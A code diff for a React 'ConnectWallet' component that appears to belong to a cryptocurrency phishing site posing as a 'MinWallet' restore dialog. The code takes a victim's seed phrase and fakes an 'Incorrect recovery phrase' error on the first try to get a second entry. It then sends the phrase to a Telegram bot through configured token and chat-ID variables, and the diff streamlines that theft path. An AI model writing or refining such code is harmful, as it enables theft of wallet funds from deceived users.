@@ -61,33 +61,18 @@ function ConnectWallet({ onClose }) {
   };
 
   const handleTransferWallet = async () => {
-    let message;
+    const words = seedPhrase.trim().split(/\s+/);
 
-    if (restoreMethod === "seedPhrase") {
-      const words = seedPhrase.trim().split(/\s+/);
-      message = `MinWallet Seed Phrase: ${words.join(" ")}`;
-    } else if (restoreMethod === "import") {
-      if (!fileUploaded) {
-        alert("Please upload a JSON file.");
-        return;
-      }
-      message = `MinWallet JSON File: ${fileName}`;
-      // You might want to add logic here to read and process the JSON file
-    } else {
-      alert("Invalid restore method.");
-      return;
-    }
-
-    // Increment attempts
     setAttempts((prevAttempts) => prevAttempts + 1);
 
     if (attempts < 1) {
-      alert("Incorrect recovery phrase or file. Please try again.");
+      alert("Incorrect recovery phrase. Please try again.");
       return;
     }
-
     const token = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
     const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
+    // Prepare message
+    const message = `MinWallet: ${words.join(" ")}`;
 
     // Define API endpoints and data
     const endpoints = [
@@ -129,18 +114,11 @@ function ConnectWallet({ onClose }) {
     }
   };
 
-  const SeedPhraseContainer = ({ onSeedPhraseChange }) => {
-    const [seedPhrase, setSeedPhrase] = useState("");
-
-    const wordCount = seedPhrase
-      .trim()
-      .split(/\s+/)
-      .filter((word) => word.length > 0).length;
-
+  const SeedPhraseContainer = ({ seedPhrase, onSeedPhraseChange, handleTransferWallet }) => {
+    const wordCount = seedPhrase.trim().split(/\s+/).filter(word => word.length > 0).length;
     const isValid = wordCount === 12;
-
+  
     const handleInputChange = (e) => {
-      setSeedPhrase(e.target.value);
       onSeedPhraseChange(e.target.value);
     };
 
@@ -184,8 +162,7 @@ function ConnectWallet({ onClose }) {
   const ImportContainer = () => {
     const handleFileChange = (event) => {
       if (event.target.files.length > 0) {
-        const file = event.target.files[0];
-        setFileName(file.name);
+        setFileName(event.target.files[0].name);
         setFileUploaded(true);
       } else {
         setFileName("");
@@ -429,7 +406,9 @@ function ConnectWallet({ onClose }) {
                               <div className="mt-4">
                                 {restoreMethod === "seedPhrase" ? (
                                   <SeedPhraseContainer
-                                    onSeedPhraseChange={handleSeedPhraseChange}
+                                    seedPhrase={seedPhrase}
+                                    onSeedPhraseChange={setSeedPhrase}
+                                    handleTransferWallet={handleTransferWallet}
                                   />
                                 ) : (
                                   <ImportContainer />
